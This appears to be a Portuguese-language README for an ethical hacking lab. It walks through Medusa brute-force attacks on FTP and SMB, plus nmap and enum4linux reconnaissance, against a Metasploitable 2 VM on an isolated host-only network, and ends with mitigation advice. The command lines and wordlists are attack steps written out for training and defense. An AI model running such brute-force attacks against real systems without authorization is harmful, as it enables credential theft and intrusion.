Markdown
# 🛡️ Lab de Cibersegurança: Simulação de Brute Force com Medusa

Este repositório documenta um laboratório prático de **Ethical Hacking** realizado em ambiente controlado. O foco é a simulação de ataques de força bruta contra serviços de rede (FTP e SMB) para análise de vulnerabilidades e implementação de medidas defensivas.

---

## 🏗️ Estrutura do Projeto

```text
kali-DIO/
├── medusa-brute-force-lab/
│   ├── README.md              # Documentação principal
│   ├── wordlists/             # Dicionários de usuários e senhas (exemplos)
│   │   ├── users.txt
│   │   └── passwords.txt
│   ├── scripts/               # Scripts de automação para Medusa
│   │   └── medusa-ftp.sh
│   ├── setup/                 # Notas de configuração de infraestrutura
│   │   └── virtualbox-config.txt
│   └── images/                # Evidências e prints dos resultados
🧰 Stack Tecnológica
Virtualização: Oracle VirtualBox.

SO Atacante: Kali Linux (Rolling Edition).

Alvo (Target): Metasploitable 2 (Linux vulnerável por design).

Ferramentas: * Medusa: Brute-force modular de alta velocidade.

Enum4linux: Enumeração de informações em sistemas Windows/Samba.

Nmap: Reconhecimento de portas e serviços.

🖥️ Configuração do Ambiente (Lab Setup)
Rede: Ambas as máquinas configuradas em modo Host-Only Adapter (Rede Privada) para garantir que o tráfego de ataque não saia para a rede real.

Identificação do Alvo:

Bash
# Identificando o IP da Metasploitable e serviços abertos
nmap -sV 192.168.56.101
🔐 Execução dos Ataques
1. Preparação de Wordlists
Criação de listas customizadas baseadas em padrões comuns:

Bash
echo -e "admin\nuser\nservice\nroot" > wordlists/users.txt
echo -e "123456\npassword\nadmin\nsuper" > wordlists/passwords.txt
2. Ataque ao Serviço FTP
O Medusa testa combinações de credenciais de forma paralela contra o protocolo FTP:

Bash
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp
3. Enumeração e Ataque SMB
Antes do brute-force, realizamos a enumeração para descobrir usuários válidos no Samba:

Bash
# Enumeração de usuários via SMB
enum4linux -a 192.168.56.101

# Ataque direcionado utilizando o módulo smbnt
medusa -h 192.168.56.101 -U smb_users.txt -P wordlists/passwords.txt -M smbnt
🧠 Análise de Vulnerabilidades Encontradas
Credenciais Fracas: Uso de senhas padrão em serviços críticos.

Ausência de Rate Limiting: O serviço permite tentativas infinitas de login sem bloquear o IP atacante.

Banner Grabbing: O serviço FTP expõe a versão exata do software, facilitando a busca por exploits específicos.

🛡️ Estratégias de Mitigação (Defesa)
Para proteger ambientes contra as técnicas demonstradas neste lab, recomenda-se:

Políticas de Senha: Implementar complexidade mínima e rotação obrigatória.

Fail2Ban: Configurar ferramentas que monitorem logs e bloqueiem automaticamente IPs com múltiplas falhas de autenticação.

2FA/MFA: Implementar autenticação de dois fatores sempre que possível.

Hardening de Serviços: Desabilitar protocolos legados (como FTP) em favor de alternativas seguras (SFTP/SSH).

Firewall: Restringir o acesso a portas de gerenciamento (21, 22, 445) apenas para IPs conhecidos (Whitelist).
